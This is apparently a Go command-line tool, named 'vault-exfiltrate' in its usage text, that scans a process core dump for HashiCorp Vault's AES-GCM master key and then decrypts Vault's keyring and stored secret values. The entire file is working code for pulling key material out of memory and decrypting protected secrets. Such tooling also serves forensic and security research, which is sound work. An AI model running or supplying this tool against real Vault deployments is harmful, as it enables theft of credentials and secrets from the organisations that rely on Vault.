package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

import "golang.org/x/exp/mmap"

import "github.com/hashicorp/vault/vault"

const (
	KeySize           = 32 // 256-bit key
	AlignmentBoundary = 8  // assume malloc respects 64-bit word size?
	KeyringPath       = "core/keyring" // logical path where the keyring is stored
)

type Region struct {
	Start  uint64
	Length uint64
}

// shell out to `readelf` and get a list of RW regions in the core file
func GetRegions(corePath string) ([]Region, error) {
	readelfCmd := exec.Command("readelf", "--program-headers", corePath)
	elfOut, err := readelfCmd.Output()
	if err != nil {
		return nil, err
	}
	result := make([]Region, 0)
	lines := strings.Split(string(elfOut), "\n")
	var currentRegion Region
	inProcess := false
	for i := 0; i < len(lines); i++ {
		line := lines[i]
		if strings.Index(line, "  LOAD") == 0 {
			fields := strings.Fields(line)
			start, err := strconv.ParseUint(fields[1], 0, 64)
			if err != nil {
				return nil, err
			}
			currentRegion = Region{Start: start, Length: 0}
			inProcess = true
		} else if inProcess {
			fields := strings.Fields(line)
			length, err := strconv.ParseUint(fields[0], 0, 64)
			if err != nil {
				return nil, err
			}
			currentRegion.Length = length
			if fields[2] == "RW" {
				result = append(result, currentRegion)
			}
			inProcess = false
		}
	}
	return result, nil
}

// create a `cipher.AEAD` from a key. this is apparently slow enough
// that under the right circumstances it benefits from caching
func aeadFromKey(key []byte) (cipher.AEAD, error) {
	aesCipher, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		return nil, err
	}
	return gcm, nil
}

func decryptInternal(path string, gcm cipher.AEAD, ciphertext []byte) ([]byte, error) {
	nonce := ciphertext[5 : 5+gcm.NonceSize()]
	raw := ciphertext[5+gcm.NonceSize():]
	out := make([]byte, 0, len(raw)-gcm.NonceSize())

	switch ciphertext[4] {
	case vault.AESGCMVersion1:
		return gcm.Open(out, nonce, raw, nil)
	case vault.AESGCMVersion2:
		return gcm.Open(out, nonce, raw, []byte(path))
	default:
		return nil, fmt.Errorf("version bytes mis-match")
	}
}

func Decrypt(path string, key []byte, plaintext []byte) ([]byte, error) {
	gcm, err := aeadFromKey(key)
	if err != nil {
		panic(err)
	}
	return decryptInternal(path, gcm, plaintext)
}

func FindMasterKeyInRegion(coreMap *mmap.ReaderAt, region Region, keyRing []byte) ([]byte, error) {
	lastPos := (region.Start + region.Length) - KeySize
	keyBuf := make([]byte, KeySize)
	for i := region.Start; i <= lastPos; i += AlignmentBoundary {
		_, err := coreMap.ReadAt(keyBuf, int64(i))
		if err != nil {
			return nil, err
		}
		plaintext, err := Decrypt(KeyringPath, keyBuf, keyRing)
		if err == nil {
			return plaintext, err
		}
	}
	return nil, fmt.Errorf("key not found")
}

func FindMasterKey(corePath string, keyRingPath string) ([]byte, error) {
	keyRing, err := ioutil.ReadFile(keyRingPath)
	if err != nil {
		return nil, err
	}

	regions, err := GetRegions(corePath)
	if err != nil {
		return nil, err
	}

	coreMap, err := mmap.Open(corePath)
	if err != nil {
		return nil, err
	}

	for i := 0; i < len(regions); i++ {
		plaintext, err := FindMasterKeyInRegion(coreMap, regions[i], keyRing)
		if err == nil {
			return plaintext, err
		}
	}

	return nil, fmt.Errorf("key not found")
}

func DecryptFile(keyRingFile string, vaultPath string, valueFile string) ([]byte, error) {
	keyRingJSON, err := ioutil.ReadFile(keyRingFile)
	if err != nil {
		return nil, err
	}

	ciphertext, err := ioutil.ReadFile(valueFile)
	if err != nil {
		return nil, err
	}

	keyRing, err := vault.DeserializeKeyring(keyRingJSON)
	if err != nil {
		return nil, err
	}

	term := binary.BigEndian.Uint32(ciphertext[:4])
	termKey := keyRing.TermKey(term)
	if termKey == nil {
		return nil, fmt.Errorf("no term key found")
	}

	return Decrypt(vaultPath, termKey.Value, ciphertext)
}

func usage() {
	os.Stderr.WriteString("usage: vault-exfiltrate extract core_file keyring_file\n")
	os.Stderr.WriteString("or:    vault-exfiltrate decrypt keyring.json path/In/Vault data_file\n")
}

func main_() int {
	if len(os.Args) == 1 {
		usage()
		return 1
	}

	if os.Args[1] == "extract" {
		if len(os.Args) < 4 {
			usage()
			return 1
		}
		keyring, err := FindMasterKey(os.Args[2], os.Args[3])
		if err != nil {
			panic(err)
		}
		os.Stdout.Write(keyring)
		return 0
	} else if os.Args[1] == "decrypt" {
		if len(os.Args) < 5 {
			usage()
			return 1
		}
		plaintext, err := DecryptFile(os.Args[2], os.Args[3], os.Args[4])
		if err != nil {
			panic(err)
		}
		os.Stdout.Write(plaintext)
		return 0
	}

	usage()
	return 1
}

func main() {
	os.Exit(main_())
}
